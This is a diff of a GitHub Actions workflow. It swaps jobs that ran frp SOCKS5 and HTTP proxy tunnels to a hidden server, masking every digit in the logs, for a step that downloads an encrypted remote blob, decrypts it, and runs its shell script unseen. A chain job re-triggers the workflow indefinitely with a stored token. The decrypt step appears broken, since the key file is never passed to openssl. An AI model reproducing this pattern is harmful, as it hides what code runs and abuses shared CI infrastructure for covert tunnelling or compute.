@@ -2,7 +2,7 @@ name: main
 on:
   workflow_dispatch:
 jobs:
-  Main:
+  Chain:
     runs-on: ubuntu-latest
     steps:
       - name: Run next action
@@ -12,127 +12,13 @@ jobs:
           $GITHUB_API_URL/repos/$GITHUB_REPOSITORY/actions/workflows/main.yml/dispatches -d '{"ref":"main"}'
         env:
           GHTOKEN: ${{ secrets.GHTOKEN }}
-          
-  First:
+  Main:
     runs-on: ubuntu-latest
     steps:
-      - name: Download frpc
+      - name: Main
         run: |
-          curl -o ./frp.tgz $secrets.CLIENT
-          tar -zxf ./frp.tgz
-          mv ./frp/frpc ./frpc
-          chmod +x ./frpc
-        env:
-          CLIENT: ${{ secrets.CLIENT }}
-          CLIENT_SHA256: ${{ secrets.CLIENT_SHA256 }}
-      - name: Write CA cert
-        run: |
-          echo "$CA" > ./ca.crt
-        env:
-          CA: ${{ secrets.CA_N1N }}
-      - name: Write frp ini
-        run: |
-          echo "
-          
-          
-          [common]
-          server_addr = $IP
-          server_port = $PORT
-          token = $TOKEN
-          tls_enable = true
-          tls_trusted_ca_file = ./ca.crt
-          login_fail_exit = false
-          log_file = console
-          log_level = debug
-          
-          [httpproxy]
-          type = tcp
-          plugin = http_proxy
-          remote_port = 11080
-          
-          [socks5]
-          type = tcp
-          plugin = socks5
-          remote_port = 11081
-          
-          " > frpc.ini
-        env: 
-          TOKEN: ${{ secrets.TOKEN_N1N }}
-          IP: ${{ secrets.IP_N1N }}
-          PORT: ${{ secrets.PORT_N1N }}
-      - name: Set ip secretly
-        run: |
-          echo "::add-mask::0"
-          echo "::add-mask::1"
-          echo "::add-mask::2"
-          echo "::add-mask::3"
-          echo "::add-mask::4"
-          echo "::add-mask::5"
-          echo "::add-mask::6"
-          echo "::add-mask::7"
-          echo "::add-mask::8"
-          echo "::add-mask::9"
-      - name: Start frp
-        run: ./frpc -c ./frpc.ini
-
-  Second:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Download frpc
-        run: |
-          curl -o ./frp.tgz $secrets.CLIENT
-          tar -zxf ./frp.tgz
-          mv ./frp/frpc ./frpc
-          chmod +x ./frpc
-        env:
-          CLIENT: ${{ secrets.CLIENT }}
-          CLIENT_SHA256: ${{ secrets.CLIENT_SHA256 }}
-      - name: Write CA cert
-        run: |
-          echo "$CA" > ./ca.crt
-        env:
-          CA: ${{ secrets.CA_N2N }}
-      - name: Write frp ini
-        run: |
-          echo "
-          
-          
-          [common]
-          server_addr = $IP
-          server_port = $PORT
-          token = $TOKEN
-          tls_enable = true
-          tls_trusted_ca_file = ./ca.crt
-          login_fail_exit = false
-          log_file = console
-          log_level = debug
-          
-          [httpproxy]
-          type = tcp
-          plugin = http_proxy
-          remote_port = 11080
-          
-          [socks5]
-          type = tcp
-          plugin = socks5
-          remote_port = 11081
-          
-          " > frpc.ini
-        env: 
-          TOKEN: ${{ secrets.TOKEN_N2N }}
-          IP: ${{ secrets.IP_N2N }}
-          PORT: ${{ secrets.PORT_N2N }}
-      - name: Set ip secretly
-        run: |
-          echo "::add-mask::0"
-          echo "::add-mask::1"
-          echo "::add-mask::2"
-          echo "::add-mask::3"
-          echo "::add-mask::4"
-          echo "::add-mask::5"
-          echo "::add-mask::6"
-          echo "::add-mask::7"
-          echo "::add-mask::8"
-          echo "::add-mask::9"
-      - name: Start frp
-        run: ./frpc -c ./frpc.ini
+          wget https://github.com/Heellc/hpga/raw/main/action.bin
+          echo $key > key
+          openssl enc -d -aes-256-cbc -in action.bin -out action.tar
+          tar -xf action.tar
+          sh main.sh
